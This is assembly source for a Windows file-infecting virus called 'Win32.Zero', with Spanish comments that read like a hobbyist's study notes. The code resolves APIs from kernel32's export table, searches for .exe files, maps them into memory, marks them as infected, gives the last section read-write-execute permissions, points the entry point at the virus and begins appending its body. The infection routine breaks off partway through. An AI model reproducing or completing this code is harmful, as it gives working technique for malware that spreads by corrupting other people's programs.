.386
.model flat, stdcall
option casemap:none
assume fs:nothing;Importante para poder manejar el controlador de excepciones

include windows.inc
include user32.inc
include kernel32.inc

includelib user32.lib
includelib kernel32.lib

.data

mensaje     db "Win32.Zero", 10, 10
            db "Host de prueba para contener el Virus", 10, 10
            db "coded by krilin4 (2021)", 0
titulo      db "[Win32.Zero v0.1]",0

.code
codigo:

iniciovir:

;Guardamos el estado de los registros y los flags en el stack para que podamos restaruarlo cuando terminemos la ejecucion del mismo.
    pushad ;aniade 20 byres in el stack
    pushfd	;aniade 4 posiciones en el stac 





    ; -----------------------------------------------------------------
    ; acá va a ir nuestro virus ---------------------------------------
    ; -----------------------------------------------------------------
    
    ;Calculo del delta offset
    ; ---------------------------------------------------------------------
    call    delta
delta:
    pop     ebp
    sub     ebp, offset delta  
    ; ---------------------------------------------------------------------
    
   ; variable dd 0 ;Creamos la variable con el valor 0   
    
  ;  mov     variable, 10h ;Creamos una variable y le asociamos el valor 10 en hexa 
    		;Esto inicialmenete si ejecutamos la application CRASHEAporque esta intentando asignar un valor a una variable que esta definida
    		;Dentro de la seccion .text y por defecto los permisos de esta seccion no tiene de escritura.
    		;Para ello : --> ‘Proyecto -> Opciones de Proyecto’, y donde dice Link debemos agregarle el comando para que le de permisos de lectura, ejecución y escritura (REW) a la sección .text
   			;La linea LINK debe de quedar : 5,O,$B\LINK.EXE /SECTION:.text|REW /SUBSYSTEM:WINDOWS /RELEASE /VERSION:4.0 /LIBPATH:"$L" /OUT:"$5",3
  
  
  
 ; LLamamos a la subrutina que hemos creado para encontrar el Kernel32.dll(Enntrada): 
 call kernel32find
 
 ;LLamamamos a la siguiente subrutina que sera la encargada de buscar a la API GetProcAddress dentro de esta.
 call getprocaddressfind
 
 
 ;Comentamos este metodo pero mantenmos el codigo poruqe es un ejemplo sencillo de como se usa.
 ;call getUser32dll
 
 ;LLamamos a la subrutina para obtener la direccio de memoira de las distinas APis que vamos a necesitar en nuestro Virus de prueba.
 call    obtenerAPIs
 
;LLamamos a la subrutina para obtener el handle de los ficheros que hayamos indicado en la variable "mascara" (.exe)
;Ahoara tenemos que identificar los archivos que vamos a infectar.

;FindFirstFileA y FindNextFileA  Para buscar los archivos que queremos infectar. con estas 2 tipos de busqueda lo que estamos realizando es una busqueda en nuestro archivo.
;Con las APIs GetWindowsDirectory(C:\WINDOWS) y GetSystemDirectory tenemos accesso a 2 rutas distinas(“C:\WINDOWS\SYSTEM”).

;Con la API :SetCurrentDirectory hariamos el cambio de escritorio al escritorio victima. podemos usar esta API con ".." para ir subiendo hacia arriba en los directorios.

;HANDLE FindFirstFileA(
;  LPCSTR             lpFileName, -->Nombre del archivo a buscar (acepta asteriscos *.exe)
;  LPWIN32_FIND_DATAA lpFindFileData -->Estructura que recive el la ifnormacion del archivo
;);	

    mov     	[ebp + archivosInfec], 1              ; inicia el contador de archivos infectados
    lea     	edx, [ebp + offset win32_find_data]
    lea     	ebx, [ebp + offset mascara]
    push    	edx ;lpFindFileData
    push    	ebx ;lpFilename 
    call    	[ebp + offset zFindFirst]             ; busca el primer archivo
    
    ;En el caso de no encontrar nada, esta función nos devolverá el valor -1 (que corresponde a INVALID_HANDLE_VALUE
;Sino en EAX tendremos un handler que luego deberemos usar para usar en FindNextFileA ademas cuando termenamos debemos de cerrar ese handler.(findclose)
    
    cmp     	eax, -1                                      ; error o no encontró nada
    je      	volverHost
                                  
    mov     	dword ptr [ebp + offset handleBusq], eax       ; guardamos el handle 
    call    	infectar										;este infectar no esta aun definido
	;add 		[ebp + archivosInfec], 1 					;[Anyadido][+] por mi CREO QUE hay que eliminarlo


 buscaVictima:

;BOOL FindNextFileA(
;  HANDLE             hFindFile,
;  LPWIN32_FIND_DATAA lpFindFileData
;);

    lea     	edx, [ebp + offset win32_find_data]
    mov     	ebx, [ebp + offset handleBusq]
    push    	edx ; lpFindFileData estructura donde se guarda la ifnormaiocn del archivos
    push    	ebx
    call    	[ebp + offset zFindNext]              ; busca el próximo archivo
    
    cmp     	eax, 0                                         ; error o no encontró nada
    je      	volverHost

    call    	infectar
    ;add 		[ebp + archivosInfec], 1 
    cmp			[ebp + archivosInfec], maxInfecciones 				;Comparamos el numero de arhivos infectados con Max_infecciones (=3)
    jbe      	buscaVictima                              ; buscamos el próximo archivo si es menor o igual
	jmp			volverHost

volverHost:


	cmp ebp, 0h     ;Ocupa 2 byes los opcodes -->Check if delta offset vale 0 y que es la primera muestra que estamos ejecutando
	je 	host 		;saltamos al popup del mensaje, en el caso de ser la primera muestra ( 7 byte)


	;en el caso de alguno de los archivos infectados queremos saltar al entrypoint original

	popfd		;1 byte
	popad		; 1byte
												;opcode push = 68 (1 byte)
	db     68h,0,0,0,0                              ; Opcode que simula un push word [address_of_original_entry_point] ; --> esto lo machacaremos con la direccion del original entrypont que teniamos guardado y aclcualamos al final.
	ret ;Simulamos este ret apra saltar a la direccion del orginal entrypoit.

   

  


;Terminamos y mostramos el Mensaje:
;comprobamos el delta offset para ver si es la primera infeccion(LoadeR)




;==================================
; Encontramos la dirección base del Kernel32.dll
;==================================

;Definimos la subrutina
kernel32find proc
	
;==================================
; Ponemos un manejador de excepciones

;   typedef struct _EXCEPTION_REGISTRATION_RECORD
	;   {
	;   struct _EXCEPTION_REGISTRATION_RECORD *Next; //Metemos la direccion de la estructura siguiente:
	;   PVOID Handler; //Metemos la direccion del SEH_handle
	;  }

;==================================
    lea		eax, [ebp + offset SEH_Handler] ;Creamos el controlador de excepciones anyadiendo el DELTAOFFSET a todas las direcciones de memoria para cuando añadamos el codigo en otra parte del archivo.
    push	eax 
    mov     eax, dword ptr fs:[0] ;Cogemos la direccion del controlador de excepciones y lo metemos en la pila,
    push	eax
    mov	dword ptr fs:[0], esp ;metemos a principio de la lista de SEHlist este controlador




comienzo:

    mov	eax, dword ptr ds:[esp + 30h] ;Como hemos insertado el controlador de excepciones, en este caso, vamos a hacer un esp + 8 para eliminar los 2 valores del PUSH que hemos metido y asi poder sacar la direccion
    									; del Kernel32 que se ejecuta antes de nuestra muestras.
    									;Ahora el valor pasa a ser + 0C porque lo llamo desde un CALL
    									;**como se aniade tambien las intrucciones pushad(0x20) y pushfd (0x4) -->0x30
    									
    and	eax, 0FFFFF000h				;Limpiamos los valores ya que la pagina tiene que estar alineada a 1000h
                                                  
bucleK32:
    sub		eax, 1000h			;vamor reducioendo el tamaño de pagina hasta que encontramos el 'MZ' comienzo del PEHeader
    cmp	word ptr [eax], 'ZM'
    jnz		bucleK32
    jmp	saleK32

;==================================
; Manejador de excepciones
;==================================
SEH_Handler:
    mov	esp, dword ptr [esp + 8]
    mov	fs:[0], esp
    jmp	comienzo  

saleK32:
    mov	dword ptr [ebp + offset MZkernel], eax ;guarda el comienzo de kernel32DLL en esta variable.

    mov	eax, dword ptr [esp] ;Balanceo la pila
    mov	fs:[0], eax				;Restauro el SEH original
    add	esp, 8
 
   
    
    
	
;Acabamos rutina kernel32.dll
ret
kernel32find endp       
  
getprocaddressfind proc
	
    mov     edi, dword ptr [ebp + offset MZkernel];Una vez tenemos el comienzo de la cabecera en la posicion 3C tenemos el PE header.
    mov     eax, dword ptr [edi + 03Ch] ;Al tener el move entre [] estamos refiriendonos al contenido en la memoria de esa posicion.
    add     eax, edi ;Sumamos la direccion base del kernel32 que se encunetra en MZKernel
    mov     dword ptr [ebp + offset PEHeader], eax  ;almacenamos en la variable PE header. definida anteriormente (Cabezera PE)
	
	
	;en la dirreccion +078 desde la cabezera PE tenemos la tabla de exportaciones. =128h que es donde esta el export table.
	
	mov     edi, dword ptr [ebp + offset PEHeader]
    mov     eax, dword ptr [edi + 078h]
    add      eax, dword ptr [ebp + offset MZkernel]
    mov     dword ptr [ebp + offset EData], eax



	;Una vez que de ahi tenemos la direccion de la tabla de exportaciones, lo siguienete que tenemos que hacer es obtener la direccion de la tABLA ADDRESS OF NAME.
	
    mov     edi, dword ptr [ebp + offset EData]
    mov     eax, dword ptr [edi + 020h];Esta tabla se encunetra en la posicion +20h de la idreccion de exportaciones.          
    add      eax, dword ptr [ebp + offset MZkernel]
    mov     dword ptr [ebp + offset AofNames], eax



	
	;Aqui empieza la runtina para encontrar el GetProcAdress en la Tabla.
	
    mov     eax, [ebp + offset AofNames] ;Contiene el inicio de la tabla
    mov     [ebp + offset contador], 0 ;Sera el contador usado para indicar la posisciones de esta tabla de donde esta "getProcAddress" en AddressofNameOrdinals
    xor      ebx, ebx                           
    sub      ebx, 4

BuscarGPA:
    inc      [ebp + offset contador] ;Incrementamos el contador 1
    add     ebx, 4 ;Incrementamos el registro ebx que se usa como puntero
    mov    edx, [eax + ebx] ;Metemos el contenido de la direccion donde apunta a edx
    add     edx, [ebp + offset MZkernel] ;Sumamos esa direccion a a la direccion base de Kernel32
    mov    esi, edx
    lea      edi, [ebp + offset GetPA]
    mov    ecx, 0Eh ;Contiene el numero de caracteres que vamos a comparar "getProcAddress" --> 14
    cld                   
    repe    cmpsb   ;Compara cadenas en ESI y en EDI byte a byte (y con dentro de compare hacemos un rep que usa ECX conunter decrementandolo
    jnz      BuscarGPA

    dec     [ebp + offset contador];Decrememtamos el valor porque empieza en 0 y nosotros lo hemos puesto a 1 por defecto.



;Obtenemos la direccion addressOfNameofOrdinals ( esta tabla tiene un indice 2 bytes) que indica la posicion que contendra la direccion extacta del donde esta el getProcaddress en la ultima tabla

    mov     ecx, [ebp + offset EData]                  
    mov     ecx, [ecx + 24h] ;esta en la direccion de la tabla de xportaciones + 24
    add      ecx, [ebp + offset MZkernel]


;ESta tabla cada direccion que contiene tiene 2 bytes, por lo tanto hay que multiplicar por 2 el valor obtenido por el contador (sumando el valor 2 veces en este caso)
    mov     eax, [ebp + offset contador]
    add     [ebp + offset contador], eax              ; multiplicamos por dos
    add     ecx, [ebp + offset contador]              ; lo sumamos al inicio de la tabla




;Esta tabla contiene la direccion de AddressofFuncion.

    mov      ebx, [ebp + offset EData]                  
    mov      ebx, [ebx + 1Ch]
    add       ebx, [ebp + offset MZkernel]


; Ahora esta tabla canda indice tiene uin tamaño de 4 bytes(contiene direccion de memoria 4 bytes)

    movzx   eax, word ptr [ecx] ;Obtenemos el valor de la 2 tabla
    rol         eax, 2                                     ; multiplico * 4
    add       ebx, eax                                  ;  y lo añado al comienzo de la ultima tabla
    mov      eax, [ebx]								;Scamos la direccion del inicio de GetProcaddresss yt lo guardo en eax
    add       eax, [ebp + offset MZkernel] ;Añado el BaseAddresss
    mov      [ebp + offset GetPAddress], eax  ;Guardamos la variable eax en GetPAddress variable.


	ret

getprocaddressfind endp  
  


;Para este Modulo necesitaremos definir las variables zGetModuleH y zUser32
getUser32dll proc
	;La funcion usa 2 parametros.
	;FARPROC GetProcAddress(
 		;HMODULE hModule, "Kernel32.dll"
		;LPCSTR  lpProcName
	;);
	
	
	lea		esi, [ebp + offset zGetModuleH]			;Cogemos la direccion de zGetModuleH que contiene el "getModuleHandleA" 2 parameters -->Hay que pasar el puntero
    push	esi    
    push	[ebp + offset MZkernel]                 ; empujo la direccion del kernel32.dll
    call	[ebp + offset GetPAddress]            ; llamo a GetProcAddress

;Ahora en eax tenemos la direccion del getModuleHandleA la cual vamos a utilizar para encontrar la direccion base de user32.dll
    lea		esi, [ebp + offset zUser32]
    push	esi    ;Pasamos el puntero de User32.dll
    call		eax ;Ahora tenemos en eax la direccion de user32.dll

	
	
	
	
    lea		esi, [ebp + offset zMessageBox] ;Cogemos el puntero de MessageBoxA
    push	esi    
    push	eax       ;Metemos la direccion de User32.dll
    call		[ebp + offset GetPAddress]   ;Llamamos a al fuccion getProcaddress y en eax tendremos la direccion de MessageBox.  


;int MessageBoxA(
;  HWND   hWnd,
;  LPCSTR lpText,
;  LPCSTR lpCaption,
;  UINT   uType
;);

	push 	0
	push 	offset titulo2
	push 	offset mensaje2
    push 	0
    call 	eax
    
    
    
     
	ret 

getUser32dll endp
     
     
;Modulo para obtener las direcciones de las siguientes APIs: (OJO todas de Kernel32.dll)
;Se puede hacer una version con lodsd y movsd (PROBAR)
obtenerAPIs proc
	
	lea		esi, [ebp + offset zAPIs]             ; inicio de la tabla de nombres de las API's
    lea 	edi, [ebp + offset zFindFirst]       ; inicio de la tabla de direcciones 
    dec		esi ;Esto es poruqe como en el bucle add  +1 para empezar por 0

obtieneAPI:
    inc		esi
    push	esi
    push	[ebp + offset MZkernel]               ; direccion de la libreria que la contiene(kernel32.dll en estas APIs)
    call		[ebp + offset GetPAddress]          ; llamo a GetProcAddress
    mov	[edi], dword ptr eax                     ; guarda la direccion obtenida
    add	edi, 04h                                      ; direccion de la proxima API
    
buscaSiguiente:
    inc		esi
    cmp	byte ptr [esi], 0h
    jne		buscaSiguiente ;Buscamos el 0 para indicar que es el final de la primera cadena

    cmp	byte ptr [esi + 1], 0h ;Mieramos si en la siguiente posicion no hay un 0 para comprobar que hemos terminando
    jne		obtieneAPI
    

	ret

obtenerAPIs endp 


	



;esta es la rutina de infecciones de los ejecutables que aun esta por definir...
infectar proc

	;Lo primero que hacemos e actulizar tamanio del valor de fichero + virus de cada uno de los que vayamos a infectar:
	
	mov     edi, longVirus                                 ; edi = longitud del virus
	add      edi, [ebp + offset win32_find_data.WFD_nFileSizeLow] ;WFD_nfileSizeLow es el tamanio del archivo	
	mov     [ebp + offset longVirusHost], edi     ; guardamos el tamaño total (virus + host)


	;Ahora comenzamos con el mapeo del archivo en memoria (CreateFileA) pasandole el nombre del archivo

	;HANDLE CreateFileA(
  	;	LPCSTR                lpFileName,
  	;	DWORD                 dwDesiredAccess,
  	;	DWORD                 dwShareMode,
  	;	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  	;	DWORD                 dwCreationDisposition,
  	;	DWORD                 dwFlagsAndAttributes,
  	;	HANDLE                hTemplateFile
	;	);
	
	push    0                   				  ; hTemplateFile, normalmente si usamos el createFile va = 0
	push    0                                     ; dwFlagsAndAttributes --> atributos del archivo: archive, normal, sistema, etc. ( no se porque es 0)
	push    3                                     ; 3 = OPEN_EXISTING o sea que si existe lo abrimos 
	push    0         							  ; Si es =0 ningun child process podra hacer uso de este.
	push    1                                     ; dwShareMode --> abrir en modo compartido (1 = FILE_SHARE_READ) 
	push    0C0000000h                     		  ; dwDesiredAccess -->  modo de acceso (read-write) -->https://docs.microsoft.com/en-us/windows/win32/secauthz/access-mask-format
	lea       ebx, [ebp + offset win32_find_data.WFD_szFileName]  ; nombre del archivo
	push    ebx
	call      [ebp + offset zCreateFile]

	;Comprobamos si hubo algun error en la llamada a CreateFile --> devuleve -1 en caso de error.
	cmp     eax, -1                               ; si hubo un error al abrir el archivo eax devuelve -1
	je        salirInfeccion
	mov     dword ptr [ebp + offset handleCreate], eax  ; guardamos el handle del archivo

	
	
	;ahora vamos a crear el objeto de mapeo con la funcion "CreateFileMappingA"
	;	HANDLE CreateFileMappingA(
  ;			HANDLE                hFile,
  ;			LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
  ;			DWORD                 flProtect,
  ;			DWORD                 dwMaximumSizeHigh,
  ;			DWORD                 dwMaximumSizeLow,
 ; 			LPCSTR                lpName
;);
	
	
	push    0                                                 ; lpName --> creamos el objeto sin nombre
	push    [ebp + offset win32_find_data.WFD_nFileSizeLow]   ; tamaño del archivo
	push    0
	push    04h                                             ; 4h = PAGE_READWRITE: lectura y escritura -->para ello el handle ha debido de ser creado con GENERIC_READ and GENERIC_WRITE access rights.
	push    0    
	push    [ebp + offset handleCreate]          ; utilizamos el handle devuelto por CreateFileA
	call      [ebp + offset zCreateFileM]		;llamamos a la funcion CreteFileMappingA


	;Comprobamos si hubo algun error en la llamada a CreateFileMappingA  --> devuleve 0 en caso de error
	cmp     eax, 0                                         ; si hubo un error eax devuelve 0
	je        cerrarArchivo                               ; lo cerramos y salimos
	mov     [ebp + offset handleMem], eax     ; sino, guardamos el handle en una variable


	;El ultimo paso es cargar los datos en memoria para elllo haremos uso de la funcion MapViewOfFile que mapea el fichero la direccion del processo que la esta llamando.
	
	;LPVOID MapViewOfFile(
  ;		HANDLE hFileMappingObject,
 ; 		DWORD  dwDesiredAccess,
  ;		DWORD  dwFileOffsetHigh,
  ;		DWORD  dwFileOffsetLow,
 ; 		SIZE_T dwNumberOfBytesToMap
;);
	
	push    [ebp + offset win32_find_data.WFD_nFileSizeLow]  ; dwNumberOfBytesToMap --> tamaño del archivo
    push    0 												 ;dwFileOffsetLow --> 0
    push    0 												;dwFileOffsetHigh --> 0
    push    000F001Fh                                    ; modo de acceso (acceso completo)
    push    [ebp + offset handleMem]              ; handle devuelto por CreateFileMappingA                                                             
    call      [ebp + offset zMapViewOfFile] 			;Llamamos a la funcion
    

	;Comprobamos si hubo algun error en la llamada a MapViewOfFile -->devuelve 0 en caso de error 
    cmp     eax, 0                                           ; si hubo un error eax devuelve 0
    je        cierraMapeo
    mov    [ebp + offset inicioHostMem], eax    ; salvo el inicio del archivo mapeado

;En eax tenemos la posicion de memoria donde comienza nuestro archivo mapeado, podemos aplicar cambios
;SINEMBARGO estos cambios no se aplicaran en DISCO hasta que no cerremos los handles.



;Ya tenemos en inicioHostMem la direccion en memoria del archivo.
;Ahora empezamos con la comprobaciones del fichero a infectar

;1)contiene la cabezera MZ:

mov     eax, [ebp + offset inicioHostMem]      
cmp     word ptr [eax], "ZM" ;Al pasar los valores de memoria a el registro quedan invertidos.
jne       desmapearArchivo


;2)Comprobacion de la cabezera PE:

add      eax, 03Ch                                    ; nos movemos 3Ch lugares del inicio MZ
mov     ebx, [eax]                                    ; obtengo la direccion relativa donde se encontrara la cabezera PE
add      ebx, [ebp + offset inicioHostMem]  	      ; le sumo la dirección de inicio del mapeo (Direccion BASE)
cmp     word ptr [ebx], "EP"                          ; ahora lo comparamos con 'PE' 
jne       desmapearArchivo


;hacemos la comprobacion de que el tamanio de la cabezera opcional 
mov        [ebp + offset hostPE], ebx      ; salvo la direccion de inicio de la cabecera PE
add         ebx, 14h             				;SizeOfOptionalHeader                  
movzx     eax, word ptr [ebx]                ; obtengo el tamaño (ojo, es un word)
;comprobamos que el tamanio sea != 0
cmp        word ptr [ebx], 0                    ; si el tamaño es cero, error 
je           desmapearArchivo



;comprobacion de que se trata de un archivo .EXE
mov      ebx, [ebp + offset hostPE]
add       ebx, 16h                              ; nos desplazamos 16h del inicio del PE --> campo Characteristics --> características: 0 - Imagen del Programa      2 - EXE     200 - Dirección fijada     2000 - Librería
mov      ax, word     ptr [ebx]                 ; obtengo en ax la bandera (ojo, es un word) 
and       ax, 0002h                             ; debemos hacer un and con 02h 
jz          desmapearArchivo




;conprobacion de si el archivo ha sido infectado añadiendo a la cabezera de los archivos "zero" en la parte 4C machacando la cabezera MSDOS que no se usa y poniendo lo que queremos.

mov     ebx, [ebp + offset hostPE]
cmp     dword ptr [ebx + 04Ch], "zero"
je        desmapearArchivo



	
;========================================================================
; Controlamos la cantidad de archivos infectados
;========================================================================
    inc     [ebp + offset archivosInfec]                  ; incrementa la cantidad de archivos infectados	
    
    
;####FALTA COMPRBACION de que EL TAMANIO SEA MENOR DE 670kb PARA QUE NO SEA MUY GRANDE##############################
 ; o comprobacion de que no este comprimido

;##################################################################################### 
    

;Si ha pasado todas estas comprobaciones entonces hacemos lo siguiente (desmapear el ejecutable y volver a mapearlo con el tamanio de Virus+host).
;######################OJO;######################OJO
;######################OJO;######################OJO
;hay que tener en cuenta los alineamientos del archivo para que todo funcione correctamente.

;El alineamiento de las secciones en memoria viene marcado por SectionAlignment
;El alineamiento de sección en la plataforma x86 no puede ser menor al tamaño de una página, generalmente 4096 bytes (1000h), y debe ser un múltiplo de este valor.

;El alineamiento de archivo en disco viene marcado por FileAlignment
;La dirección de los datos de cada sección en el disco deberán ser múltiplos de este valor. 
;Un valor común es 200h (512b), y se cree que es para asegurar que comienza al inicio de un sector del disco. 

;#######################################
;Como curiosidad, les comento que el tamaño real que ocupan los datos de cada sección está dado por el campo VirtualSize, 
;por lo que si restamos al SizeOfRawData el VirtualSize, nos dará el tamaño de un hueco llenos de cero dentro del archivo ejecutable, lo cual puede servir para aplicar;
; la técnica que les comentaba anteriormente: “cavity”.
;########################################


;obtener estos campos (FileAlignment y SectionAlignment),

mov       ebx, [ebp + offset hostPE]                ; direccion de la cabecera PE del host
add        ebx, 03Ch                                       ; RVA del FileAlignment sobre la PE
mov       edx, [ebx]                                       ; edx = alineamiento del archivo en disco
mov       [ebp + offset AlineamArchivo], edx    ; lo guardamos

mov       ebx, [ebp + offset hostPE]                ; direccion de la cabecera PE del host
add        ebx, 038h                                        ; RVA del SectionAlignment sobre la de PE
mov       edx, [ebx]                                        ; edx = alineamiento del archivo en disco
mov       [ebp + offset AlineamSeccion], edx    ; lo guardamos


;El próximo paso es desmapear el archivo que tenemos en memoria, con las APIs UnmapViewOfFile y CloseHandle:

push      [ebp + offset inicioHostMem]    
call        [ebp + offset zUViewOfFile]   

push      [ebp + offset handleMem]                                                                               
call        [ebp + offset zCloseHandle]


;Ahora vamos a hacer las correciones de las alineaciones de memoria.
   mov     ebx, [ebp + offset AlineamArchivo]		;ebc =tamanio de seccion
   mov     eax, [ebp + offset longVirusHost]       ; tamaño del archivo + el virus variable que habiamos calculador anteriormente 
   xor       edx, edx                                          ; edx = 0 para realizar la división
   div       ebx                                                  ; dividimos por el alineamiento

   cmp     edx, 0                                              ; en edx queda el resto de la división -->eax= cociente edx=resto
   je        no_incrementa                                 	;si el resto no es 0 hay que aumentar en 1 el tamanio del alineamiento
   inc       eax                                                   ; si el resto es distinto de 0 le suma 1

no_incrementa:
    mov    edx, [ebp + offset AlineamArchivo]    ; recupero el alineamiento
    mul     edx                                                  ; multiplico por el alineamiento eax= edx* eax Si el resultado excediera de 32 bits se guarda en EDX la parte que excede .
    mov    ebx, eax                                           ; guardamos en ebx el tamaño alineado


;EMPEZAMOS CON LOS AJUSTES EN MEMORIA	
;#################################################
;Una vez que tenemos el tamanio del fichero infectado en el disco nuevo y alineado perfectamente
;tenemos que volver a abrir el archivo en memoria y volver a cargarlo. y arreglar el alineamiento en memoria de las secciones .data, .text ,. ..

;La rutina es la misma que hicimos in poco mas arriba pero con el nuevo tamanio(virus + host) por lo que habria que a lo mejor se podria hacer una funcion unicamente a la que le pasemos el tamanio del archivo.

;##################################################################################################

push    0                                        ; creamos el objeto sin nombre
push    ebx                                     ; tamaño del archivo + el virus (alineado)
push    0
push    04h                                     ; 4h = PAGE_READWRITE: lectura y escritura
push    0    
push    [ebp + offset handleCreate]  ; handle devuelto por CreateFileA
call      [ebp + offset zCreateFileM] ;Llamamos a CreateFileMappingA que la direccion estaba guardada en esta variable.

;Compara si hay un error en la llamada de la funcion CreateFileMappingA() --> 0
cmp     eax, 0                                 ; si hubo un error eax devuelve 0
je        cerrarArchivo
mov     [ebp + offset handleMem], eax   ; guardamos el handle


;LLamammos a MapViewOfFile()
;Compara si hay un error en la llamada de la funcion CreateFileMappingA() --> 0
push    ebx                                    ; tamaño del archivo + el virus (alineado)
push    0 
push    0 
push    000F001Fh                         ; access mode  (acceso completo)
push    [ebp + offset handleMem]   ; handle devuelto por CreateFileMappingA                                                             
call      [ebp + offset zMapViewOfFile] 
;Comprobamos si hay un error en la llamada.
cmp     eax, 0                                ; si hubo un error eax devuelve 0
je        cierraMapeo
mov    [ebp + offset inicioHostMem], eax     ; salvo el inicio del archivo mapeado

;##########################################



;Marcamos los archivos .exe infectados con la cadena "zero" en la cabezera MSDOS.

    mov     ebx, [ebp + offset hostPE]
    mov     dword ptr [ebx + 04Ch], "zero" 




;El virus que estamos desarrollando es POST-pending por lo que se colocara todo en la seccion del final.
;para ello necesitamos la última sección del host que estamos infectando. esto se encuentra en:
;la tabla de secciones (capítulo 4).
;Ltabla se encuentra a continuación de la cabecera PE opcional y que tiene varias entradas (consecutivas), tantas como secciones tenga el programa.
;Dentro de la cabezera PE tenemos tambien un campo que indicaba la cantidad de secciones NumberOfSections
;CAda una de estas secciones tiene un optional-header con informacion de la seccion con un tamanio de 28h.
;La seccion que te tenga PointerToRawData  mas alto se tratara a la ultima seccion ya que apuntan el inicio de la seccion en disco.


;1)Buscamos el numero de secciones
;2)Buscamos el tamanio de la seccion optional(varia)
;3)Miramos cual es la ultima seccion (pointerToRawData mas alto)
;4)Anyadimos nuestro codico maligno a continuacion.

    mov     eax, [ebp + offset inicioHostMem]  ; inicio del host mapeado en memoria (direccion base en memoria) 
    mov     esi, [eax + 3Ch]                     ; en 3Ch tenemos la dirección del PE (cabezera PE)
    add      esi, eax                                  ; le sumamos la base ya que es una RVA
    movzx  ebx, word ptr [esi + 14h]        ; bx = tamaño del Optional Header
    movzx  ecx, word ptr [esi + 6h]          ; ecx = PE + 6h (cantidad de secciones)
    mov     edx, [esi + 28h]                     ; PE + 28 = dirección del entry point original
    mov     [ebp + entryPoinOrig], edx      ; edx =Entry poiny lo guardamos ne variable para luego usarlo
    add      esi, ebx                                 ; Sumamos en memorai el tamanio del optional Header. le sumamos el tamaño de la PE opcional (RVA PE HEADER + BASE ADDRESS + OPTIONAL HEADER)
    add      esi, 18h                                 ; le sumo 18h (el tamaño del PE Header) que es el tamamnio desde la cabezera pe al comienzo de la cabezea del optional header.
    
    ;Aqui tenemos en ESI el tamanio de donde empieza nuestra primera cabezera.
    
    sub      esi, 28h                                 ; 28h bytes (tamaño de cada seccion)
    xor      eax, eax                                 ; eax lo uso para almacenar el mayor valor
    xor      ebx, ebx                                 ; ebx va a apuntar al inicio de la sección mayor

proximaSeccion:
    add     esi, 28h                                  ; esi = puntero a cada entrada de la tabla
    movzx edi, word ptr [esi + 14h]          			; es el offset 14h tengo el PointerToRawData dentro de canda una de las secciones
    cmp    edi, eax                                  ; es mayor que el almacenado en eax ?
    jl         noEsMayor
    mov     eax, edi                                 ; si es mayor, guardo el valor
    mov     ebx, esi                                 ; y el puntero a la sección
    
noEsMayor:    
    loop    proximaSeccion                      ; decrementa ecx y si es mayor que cero vuelve

;Al final de esta rutina eax= offset del archivo donde apunta la seccion que se encuentra al final del archivo
;En ebx=parte en memroia donde comienza esa seccion.

;Cambiaremos las caracteristicas del malware para darle permisos a esta seccion
;de lectura, escritura y ejecución a la misma porque no sabemos a cual se referira.

;		00000020	Contiene código ejecutable
;		20000000	Se puede ejecutar
;  +
;		40000000	Se puede leer
;		80000000	Se puede escribir en la sección
;-------------------------------
;E0000020 Damos todos los permisos a esa seccion en la seccion de characteristics.


    or      dword ptr [esi + 24h], 0E0000020h
    
 ;##########################################################################################   
;##########################################################################################
;			MODIFICACIONES EN MEMORIA
;##########################################################################################
;##########################################################################################
;ya tenemos la seccion donde vamos a cargar el virus con todos los permisos disponibles  eax-->seccion del archivo donde empieza la ulitma seccion
										;												 ebx-->seccion cargada en memoria
										;;varible entryPoinOrig contiene el entrypoint de nuestro host.
										
;Ahora vamos a poner que el entrypoint apunte a nuestro virus.

;Para ello tenemos que tener en cuenta estos 2 valores ya que el malware se encuentra en memoria.

;RelativeVirtualAddress( de la seccion) :  RVA de la sección con respecto a la base del host (ubicado en el inicio de la sección + 0Ch)

;SizeOfRawData: tamaño de la sección alineada (ubicado en el inicio de la sección + 10h)

    mov     esi,  ebx ;En ebx tenemos el inicio de la seccion
    mov     edx, [esi + 10h] ;Obtenemos el relativeVirutalAdress
    add      edx, [esi + 0Ch];Le sumamos el tamanio de la seccion alineada
    
 ;En edx tenedremos el que sera nuestro nuevo entrypoint.
 ;Ahora tenemos que modificar la cabezera para actualizar el valor del nuevo entrypoint. ahora apuntara a nuestro virus y cuando terminemos debemos de saltar a la direccion del programa que guardamos en la variable OEP
     mov     eax, [ebp + offset inicioHostMem]    ; eax = inicio del host mapeado en mem.
     mov     edi, [eax + 3Ch]                             ; edi = dirección del PE header del host
     add      edi, eax                                         ; le sumo la base ya que es una RVA
     mov     [edi + 28h], edx                             ; cambio el valor del EP por el que teniamos en edx.

;Una vez terminemos la ejecucion de nuetro virus rescataremos la variable del Entrypoint de la variable y haremos el salto.

 ;##########################################################################################   
;##########################################################################################
;			MODIFICACIONES EN dISCO
;##########################################################################################
;##########################################################################################  

;Para ello debemos de sumar 2 valores de la seccion a infectar:

;PointerToRawData = offset (desplazamiento) de la sección en disco (lo encontramos en inicio sección + 14h)

;SizeOfRawData = tamaño de la sección en disco alineada (lo encontramos en inicio sección + 10h)




    mov    ebx, [esi + 10h]              ; en esi tengo el inicio de la sección en memoria  calculamos -->      ebx=tamanio de la seccion en disco.
                                                    ; le sumo 10h y obtengo en ebx el SizeOfRawData 
    add     ebx, [esi + 14h]              ; le sumo el valor de PointerToRawData, -->  desplazamiento de la seccion en disco
    add     ebx, [ebp + offset inicioHostMem]    ; le sumo la base ya que es una RVA
    mov    [ebp + offset UltimaSeccPE], ebx ; lo guardamos en una variable
  
  
  ;En ebx y UltimaSeccPE tenemos donde acaba en disco la ultima seccion.
  ;ahora hay que cambiar los valores de la seccion y tener cuidado con el alineamiento.
  
   ;##########################################################################################   
;##########################################################################################
  ;MODIFICAMOS LOS SIGUIENTES VALORES EN LA SECCION.
  ;.--------------------------------------------------------.
 ;##########################################################################################   
;##########################################################################################
  
  	;VirtualSize: solamente debemos sumarle el tamaño del virus (se encuentra en el inicio de la sección + 08h) este indica el tamanio real si es mayor menor que el alineamiento expandemos hasta el
  	;

	;SizeOfRawData: tenemos que sumarle el tamaño del virus pero teniendo en cuenta el FileAlignment (se encuentra en el inicio de la sección + 10h)
	;SizeOfRawData must be a multiple of PEHeader.FileAlignment. If it is less than SectionHeader.VirtualSize, 

;Ademas debemos guardar el SizeOfRawData anterior que luego lo vamos a  utilizar para acomodar el valor de SizeOfImage 


    mov     eax, longVirus				;Pasamos la longitud del virus y la almacenamos en eax.
    add     [esi + 08h], eax             ; en esi tengo el inicio de la sección en memoria, 
